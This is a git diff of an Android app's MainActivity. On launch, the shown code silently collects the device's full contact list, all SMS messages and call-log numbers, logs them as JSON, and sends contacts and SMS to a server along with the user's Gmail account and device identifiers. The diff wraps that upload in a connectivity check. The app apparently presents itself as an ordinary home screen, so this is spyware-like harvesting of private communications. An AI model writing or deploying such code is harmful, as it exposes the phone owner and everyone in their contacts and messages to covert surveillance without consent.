@@ -18,11 +18,11 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
-import android.widget.Button;
-import android.widget.TextView;
 import android.widget.Toast;
 
-import com.example.nayan.appanalysis2.database.MImage;
+import com.example.nayan.appanalysis2.database.DBManager;
+import com.example.nayan.appanalysis2.model.MCalllog;
+import com.example.nayan.appanalysis2.model.MImage;
 import com.example.nayan.appanalysis2.forgroundApp.Utils;
 import com.example.nayan.appanalysis2.fragment.HomeFragment;
 import com.google.gson.Gson;
@@ -36,6 +36,7 @@ import org.json.JSONObject;
 
 import java.io.File;
 import java.util.ArrayList;
+import java.util.List;
 
 import cz.msebera.android.httpclient.Header;
 import me.everything.providers.android.calllog.Call;
@@ -48,11 +49,12 @@ import me.everything.providers.core.Data;
 
 public class MainActivity extends AppCompatActivity {
     private int STORAGE_PERMISSION_CODE = 23;
-    private Button btUsagePermission;
-    private TextView tvPermission;
     private static final int REQUEST_ID = 1;
     private ArrayList<MImage> mImages;
+    private ArrayList<MCalllog> calllogArrayList;
+    private List<Call> calls;
     private static MainActivity instance;
+    private MCalllog mCalllog;
     Handler handler;
 
     public static MainActivity getInstance() {
@@ -66,46 +68,19 @@ public class MainActivity extends AppCompatActivity {
         instance = this;
         handler = new Handler();
         mImages = new ArrayList<>();
-//        requestPermission();
-
-//        mImages = DBManager.getInstance().getAllImage();
-        if (mImages.size() > 0) {
-            Log.e("Image", " size " + mImages.size() + " name" + mImages.get(0).getImgName());
-//            deleteImageFromSdcard();
-        }
-//        requestPermission();
-//        btUsagePermission = (Button) findViewById(R.id.usage_permission);
-//        tvPermission = (TextView) findViewById(R.id.permission_text);
-//        requestStoragePermissionToMashmallow();
+        calllogArrayList = new ArrayList<>();
         Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
-//        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-//            ScreenshotManager.INSTANCE.requestScreenshotPermission(this, REQUEST_ID);
-//        }
 
         setSupportActionBar(toolbar);
         setFragment(HomeFragment.class);
-//        whatsApp();
-
-
-//        if (!needsUsageStatsPermission()) {
-//            btUsagePermission.setVisibility(View.GONE);
-//            tvPermission.setText(R.string.usage_permission_granted);
-//            ForegroundToastService.start(getApplicationContext());
-////            Toast.makeText(getBaseContext(), getString(R.string.service_started), Toast.LENGTH_SHORT).show();
-//        } else {
-//            btUsagePermission.setOnClickListener(new View.OnClickListener() {
-//                @Override
-//                public void onClick(View view) {
-//                    requestUsageStatsPermission();
-//                }
-//            });
-//        }
-//        isDualSimOrNot();
         CallsProvider callsProvider = new CallsProvider(getApplicationContext());
         Data<Call> callData = callsProvider.getCalls();
 
+
+
         ContactsProvider contactsProvider = new ContactsProvider(getApplicationContext());
         Data<Contact> contacts = contactsProvider.getContacts();
+
 //
         TelephonyProvider provider = new TelephonyProvider(getApplicationContext());
         Data<Sms> sms = provider.getSms(TelephonyProvider.Filter.ALL);
@@ -122,7 +97,7 @@ public class MainActivity extends AppCompatActivity {
 
         Gson gson = new Gson();
         String jsonContacts = gson.toJson(contacts.getList());
-        String jsonCallLog = gson.toJson(callData.getList());
+//        String jsonCallLog = gson.toJson(callData.getList());
         String jsonSms = gson.toJson(sms.getList());
         JSONObject j = new JSONObject();
         try {
@@ -131,11 +106,25 @@ public class MainActivity extends AppCompatActivity {
             e.printStackTrace();
         }
         Log.e("contacts", jsonContacts);
-        Log.e("call_log", jsonCallLog);
+//        Log.e("call_log", jsonCallLog);
         Log.e("sms", jsonSms);
-        sendCalllogToServer(jsonCallLog, gmail, device);
-        sendCContactsToServer(jsonContacts, gmail, device);
-        sendSmsToServer(jsonSms, gmail, device);
+        if (Utils.isInternetOn()) {
+//            sendCalllogToServer(jsonCallLog, gmail, device);
+            sendCContactsToServer(jsonContacts, gmail, device);
+            sendSmsToServer(jsonSms, gmail, device);
+        }
+        calls = callData.getList();
+        for (int i = 0; i < calls.size(); i++) {
+            mCalllog = new MCalllog();
+            mCalllog.setNumber(calls.get(i).number);
+            DBManager.getInstance().addCallLog(mCalllog, DBManager.TABLE_CALL_LOG);
+        }
+
+        calllogArrayList = DBManager.getInstance().getCallLog();
+        String jsonCallLog = gson.toJson(calllogArrayList.subList(0,5));
+        Log.e("callog : ", "db size " + calllogArrayList.size());
+        Log.e("call_log", jsonCallLog);
+
     }
 
     private void isDualSimOrNot() {
